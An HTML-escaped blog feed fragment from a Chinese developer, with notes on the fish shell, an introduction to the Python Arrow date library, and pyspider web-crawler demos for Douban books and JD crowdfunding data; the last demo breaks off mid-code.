&lt;p&gt;fish_vi_mode&lt;/p&gt;
&lt;h2&gt;在线设置&lt;/h2&gt;
&lt;p&gt;fish_config&lt;/p&gt;
&lt;h2&gt;可选主题&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/Themes.md"&gt;fish themes&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;安装主题&lt;/h3&gt;
&lt;p&gt;omf install  agnoster&lt;/p&gt;
&lt;h2&gt;配置&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;~/.config/fish/config.fish&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;python 环境&lt;/h2&gt;
&lt;p&gt;需要注意的是使用virtualenv创建的python env，需要使用以下指令进入：&lt;code&gt;source env/bin/activate.fish&lt;/code&gt;,而不是bash和zsh下的&lt;code&gt;source env/bin/activate&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;资料&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://hackercodex.com/guide/install-fish-shell-mac-ubuntu/"&gt;Install Fish Shell on Mac OS X and Ubuntu&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;插件&lt;/h1&gt;
&lt;h2&gt;&lt;a href="https://github.com/sjl/z-fish"&gt;z-fish&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;目录快速移动&lt;/p&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;git clone https://github.com/sjl/z-fish.git&lt;/li&gt;
&lt;li&gt;. /path/to/z.fish添加到 ~/.config/fish/config.fish&lt;/li&gt;
&lt;li&gt;z --add "$PWD"&lt;/li&gt;
&lt;li&gt;z [-h/-l]&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;问题&lt;/h1&gt;
&lt;h3&gt;history&lt;/h3&gt;
&lt;p&gt;ubuntu上默认的fish版本太久，需要用新版的fish，这样在tmux中的历史也可用&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 03 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-03:from-zsh-to-fish.html</guid><category>dev-tools</category></item><item><title>更好的Python时间日期库 Arrow</title><link>/arrow-better-dates-and-times-for-python.html</link><description>&lt;h1&gt;问题&lt;/h1&gt;
&lt;p&gt;使用Python标准库来处理时区、日期转换、格式输出之类的问题，十分繁琐。标准库虽然提供了完备的功能，但常用方法分布得十分散乱。每次使用都得在文档里奔波&lt;/p&gt;
&lt;h1&gt;Arrow&lt;/h1&gt;
&lt;p&gt;Arrow提供了明智、友好的的方式来创建（操作/格式化/转换）时间（日期/时间戳）
，如此一来常用函数易于调用，而不是藏于深巷。只需要查阅一处文档即可&lt;/p&gt;
&lt;p&gt;Arrow的灵感来自&lt;a href="https://github.com/moment/moment"&gt;moment.js&lt;/a&gt; 和 &lt;a href="https://github.com/kennethreitz/requests"&gt;requests&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;pip install arrow&lt;/p&gt;
&lt;h1&gt;快速开始&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;arrow&lt;/span&gt;
&lt;span class="n"&gt;utc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arrow&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;utc&lt;/span&gt; &lt;span class="c1"&gt;#&amp;lt;Arrow [2015-12-02T01:55:16.190145+00:00]&amp;gt;&lt;/span&gt;

&lt;span class="n"&gt;utc_Beijing&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;utc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hours&lt;/span&gt;&lt;span class="o"&gt;=+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#北京时间 东八区&lt;/span&gt;
&lt;span class="n"&gt;utc_Beijing&lt;/span&gt; &lt;span class="c1"&gt;#&amp;lt;Arrow [2015-12-02T09:55:16.190145+00:00]&amp;gt;&lt;/span&gt;

&lt;span class="c1"&gt;#local&lt;/span&gt;
&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;utc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Asia/Shanghai&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="c1"&gt;#&amp;lt;Arrow [2015-12-02T09:55:16.190145+08:00]&amp;gt;&lt;/span&gt;

&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timestamp&lt;/span&gt; &lt;span class="c1"&gt;#1449021316&lt;/span&gt;

&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#u&amp;#39;2015-12-02 09:55:16+08:00&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;YYYY-MM-DD HH:mm:ss ZZ&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;#u&amp;#39;2015-12-02 09:55:16 +08:00&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;humanize&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="c1"&gt;#u&amp;#39;2 minutes ago&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;humanize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;locale&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zh_cn&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#3分钟前&lt;/span&gt;

&lt;span class="n"&gt;arrow&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2013-05-11T21:23:58.970460+00:00&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;#&amp;lt;Arrow [2013-05-11T21:23:58.970460+00:00]&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://arrow.readthedocs.org/en/latest/#arrow-better-dates-and-times-for-python"&gt;Arrow: better dates and times for Python&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 02 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-02:arrow-better-dates-and-times-for-python.html</guid><category>技术</category></item><item><title>用pyspider写的爬虫几例</title><link>/pyspider-demo.html</link><description>&lt;h1&gt;爬虫&lt;/h1&gt;
&lt;p&gt;最初折腾爬虫还是在校期间，一个玩具项目，想把校内信息爬取下来，写一个小型校内搜索引擎，整合到公众号里&lt;/p&gt;
&lt;p&gt;而后原理实现之后，就不想打磨细节了，急着跳入下一个坑。如那个笑话里的，程序员好不容易买齐了笔墨纸砚，写下&lt;code&gt;hello world&lt;/code&gt;，就心满意足地离去了&lt;/p&gt;
&lt;p&gt;去年在知乎里答过一个爬虫题目，拿了1000来个赞，陆陆续续收到一些私信问有没有兴趣换工作啥的，当时的百度和美团还是蛮有吸引力的，哎谁知一年多工夫，局势变了好多，看来拒绝的还算有先鉴之明。如pyspider作者binux所言，爬虫就那点东西，有趣的部分并不多，所以也从未考虑过此类工作。&lt;/p&gt;
&lt;p&gt;闲暇时间，陆陆续续写过简易的几个爬虫玩具，帮朋友爬过1w枚种子，据说质量奇高，是xx中的艺术片。也爬过豆瓣知乎，数据拿来训练机器人。&lt;/p&gt;
&lt;p&gt;说要种子的，我也不会给你啦，代码有毒，身体要紧啊同学们&lt;/p&gt;
&lt;p&gt;写爬虫比较钟爱pyspider，选择器是jquery语法（用了pyquery），调试起来十分方便，而且又有web界面很是舒服&lt;/p&gt;
&lt;p&gt;以下几个demo，需求都来自小伙伴。&lt;/p&gt;
&lt;h1&gt;pyspider介绍&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/binux/pyspider"&gt;pyspider&lt;/a&gt;作者在在博客里说到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pyspider 来源于以前做的一个垂直搜索引擎使用的爬虫后端。我们需要从200个站点（由于站点失效，不是都同时啦，同时有100+在跑吧）采集数据，并要求在5分钟内将对方网站的更新更新到库中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;和大多开源项目一样，pyspider也始于作者自己真实的需求，而后发现这个解决方案对于其他人也是适用的，于是开源出来。正是自己最初真实的需求，使项目在细节方面十分周到贴心&lt;/p&gt;
&lt;p&gt;十分推荐有兴趣的小伙伴把作者博客里的几篇文章读完:&lt;a href="http://blog.binux.me/"&gt;Binuxの杂货铺&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是关于爬虫方面我读过最简易清晰的几篇文章了&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;h2&gt;mac下安装与运行&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;virtualenv env &lt;span class="c1"&gt;#使用virtualenv建立虚拟环境&lt;/span&gt;
&lt;span class="nb"&gt;source&lt;/span&gt; env/bin/activate
pip install pyspider
brew install phantomjs &lt;span class="c1"&gt;#运行js的环境（ajax）&lt;/span&gt;
pyspider phantomjs &lt;span class="c1"&gt;#开启服务在25555端口&lt;/span&gt;
pyspider
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;使用docker安装&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;docker pull binux/pyspider:master
sudo docker run -d -p 5000:5000 -v /opt/pyspider:/opt/pyspider binux/pyspider:master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后在5000端口上就可以写爬虫逻辑啦，web本身作为控制面板&lt;/p&gt;
&lt;p&gt;参考&lt;a href="http://docs.pyspider.org/en/latest/Running-pyspider-with-Docker/"&gt;Running-pyspider-with-Docker&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;demo&lt;/h1&gt;
&lt;h3&gt;1&lt;/h3&gt;
&lt;p&gt;爬取豆瓣8分以上书籍&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;
&lt;span class="c1"&gt;# Created on 2015-09-17&lt;/span&gt;
&lt;span class="c1"&gt;# Project: douban_book&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pyspider.libs.base_handler&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;crawl_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://book.douban.com/tag/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index_page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;index_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a[href^=&amp;quot;http&amp;quot;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;r&amp;quot;http://www.douban.com/tag/\w+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="c1"&gt;#print each.attr.href&lt;/span&gt;
                &lt;span class="c1"&gt;#romantic novels tag ：  http://www.douban.com/tag/%E8%A8%80%E6%83%85/?focus=book&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;list_page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;list_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;#print re.search(r&amp;#39;http://www.douban.com/tag/[^/]*&amp;#39;,response.url ,).group() + &amp;#39;/book&amp;#39;&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;http://www.douban.com/tag/[^/]*&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="p"&gt;,)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/book&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;list_page_detail&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;list_page_detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a[href^=&amp;quot;http&amp;quot;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;http://book.douban.com/subject/\d+&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;page_detail&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.next &amp;gt; a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="c1"&gt;#print each.attr.href&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crawl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;list_page_detail&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;page_detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;vote_average&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;strong[property=&amp;quot;v:average&amp;quot;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;float&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vote_average&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;http://book.douban.com/subject/\d+&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;h1 &amp;gt; span&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;vote_average&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;strong[property=&amp;quot;v:average&amp;quot;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;vote_num&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;span[property=&amp;quot;v:votes&amp;quot;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;demo2&lt;/h3&gt;
&lt;p&gt;爬取京东众筹数据&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;
&lt;span class="c1"&gt;# Created on 2015-11-30&lt;/span&gt;
&lt;span class="c1"&gt;# Project: jdzc&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pyspider.libs.base_handler&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;crawl_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;



    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;#手动输入最大页面，这部分有ajax很烦 手写吧&lt;/span&gt;
        &lt;span class="c1"&gt;#max_page = response.doc(&amp;#39;a.next&amp;#39;)&lt;/span&gt;
        &lt;span class="c1"&gt;#print max_page&lt;/span&gt;
        &lt;span class="n"&gt;max_page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;218&lt;/span&gt; &lt;span class="c1"&gt;#当前是218，有了phantomjs后可以自动获取&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;page_num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;max_page&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
